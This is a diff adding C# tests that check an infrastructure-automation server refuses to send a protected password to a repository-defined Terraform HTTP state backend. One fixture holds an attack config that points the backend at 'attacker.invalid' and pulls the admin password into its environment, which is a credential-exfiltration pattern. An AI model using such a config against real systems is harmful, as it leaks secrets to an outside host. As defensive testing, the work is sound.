@@ -273,6 +273,87 @@ public class ProtectedSecretTests(PostgresFixture postgres)
         Assert.Contains("proxmox/korriban/read-only-token", (await server.LatestRunAsync(Secondary, Operations.Provision)).Detail);
     }
 
+    private const string AttackerBackend = """
+        schemaVersion: 1
+        stateBackends:
+          postgres:
+            type: http
+            config: { address: "https://attacker.invalid/state" }
+            env:
+              TF_HTTP_PASSWORD: { store: dns/admin }
+        """;
+
+    [Fact]
+    public async Task An_unchanged_root_cannot_take_the_password_to_a_new_state_backend()
+    {
+        // The attack: not one line of code changes, so resource and digest of code still match.
+        // HTTP backend authentication would send the password during init, before any approval.
+        using var repository = ClusterDefinitionTests.Repository();
+        var (server, agent, client) = await StartAsync(postgres, repository);
+        await using var _ = server;
+        using var __ = client;
+        await TrustCodeAsync(client);
+        await FinishGuestsAsync(server, agent);
+        var released = await ReleasesAsync(server);
+
+        repository.Delete("labs/home/clusters/technitium");
+        repository.Write("octopushy.yaml", AttackerBackend);
+        server.Commit("Keep the state somewhere else");
+        await server.SyncAsync();
+        Assert.True((await server.QueryAsync(db => db.Revisions.OrderByDescending(r => r.Sequence).FirstAsync())).RepositoryValid);
+
+        var withheld = await DriveAsync(server, agent);
+        Assert.DoesNotContain(withheld, a => a.Secrets.Values.Contains(Password));
+        Assert.DoesNotContain(withheld, a => a.Action == "preview");
+        var run = await server.LatestRunAsync(Secondary);
+        Assert.Equal(RunStatuses.Blocked, run.Status);
+        Assert.StartsWith("Waiting for trust", run.Detail);
+        Assert.Equal(released, await ReleasesAsync(server));
+    }
+
+    [Fact]
+    public async Task A_protected_secret_never_goes_to_a_backend_even_for_a_grant_of_exactly_that()
+    {
+        using var repository = ClusterDefinitionTests.Repository();
+        var (server, agent, client) = await StartAsync(postgres, repository);
+        await using var _ = server;
+        using var __ = client;
+        await TrustCodeAsync(client);
+        await FinishGuestsAsync(server, agent);
+
+        repository.Delete("labs/home/clusters/technitium");
+        repository.Write("octopushy.yaml", AttackerBackend);
+        server.Commit("Keep the state somewhere else");
+        await server.SyncAsync();
+        await DriveAsync(server, agent);
+
+        // An operator clicks through it. The value of a backend's environment reaches init, which
+        // is before any plan, so it is not something a review of the run can come in time for.
+        var run = await server.LatestRunAsync(Secondary);
+        var digest = RunContext.Parse(run.Context).CodeDigest;
+        (await client.PostAsJsonAsync("/api/variables/grants", new { key = Key, resourceId = run.ResourceId, codeDigest = digest })).EnsureSuccessStatusCode();
+
+        var released = await ReleasesAsync(server);
+        var withheld = await DriveAsync(server, agent);
+        Assert.DoesNotContain(withheld, a => a.Secrets.Values.Contains(Password));
+        Assert.Equal(released, await ReleasesAsync(server));
+        Assert.Contains("state backend", (await server.LatestRunAsync(Secondary)).Detail);
+    }
+
+    [Fact]
+    public async Task Trust_cluster_shows_how_each_member_would_run()
+    {
+        using var repository = ClusterDefinitionTests.Repository();
+        var (server, _, client) = await StartAsync(postgres, repository);
+        await using var __ = server;
+        using var ___ = client;
+        var member = (await ClusterAsync(client))["members"]!.AsArray().Single(m => m!["guest"]!.GetValue<string>() == Secondary)!;
+        var execution = member["execution"]!;
+        Assert.Equal("pg", execution["backend"]!["type"]!.GetValue<string>());
+        Assert.Equal("dns/admin", execution["secrets"]!["admin_password"]!.GetValue<string>());
+        Assert.Contains("home", execution["agentLabels"]!.AsArray().Select(l => l!.GetValue<string>()));
+    }
+
     [Fact]
     public async Task A_run_with_a_protected_secret_receives_only_the_reviewed_files()
     {
